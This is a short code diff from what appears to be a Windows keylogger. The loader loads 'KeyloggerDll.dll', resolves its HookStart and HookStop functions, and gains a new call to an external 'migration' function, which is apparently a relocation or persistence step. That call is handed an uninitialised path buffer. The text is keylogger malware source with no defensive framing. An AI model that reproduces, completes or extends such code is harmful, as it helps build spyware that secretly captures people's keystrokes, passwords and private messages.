@@ -8,6 +8,7 @@
 
 #define KEYLOGGER_DLL "KeyloggerDll.dll"
 using namespace std;
+extern void migration(char *filepath);
 
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
 typedef void(*PFN_HOOKSTART)(HWND);
@@ -52,13 +53,15 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 	PFN_HOOKSTART HookStart = NULL;
 	PFN_HOOKSTOP HookStop = NULL;
 	HMODULE hDll = NULL;
-
+	char filepath[MAX_PATH];
 	hDll = LoadLibraryA(KEYLOGGER_DLL);
 	if (hDll == NULL)
 	{
 		cout << GetLastError();
 		return 1;
 	}
+
+	migration(filepath);
 
 	HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, "HookStart");
 	HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, "HookStop");
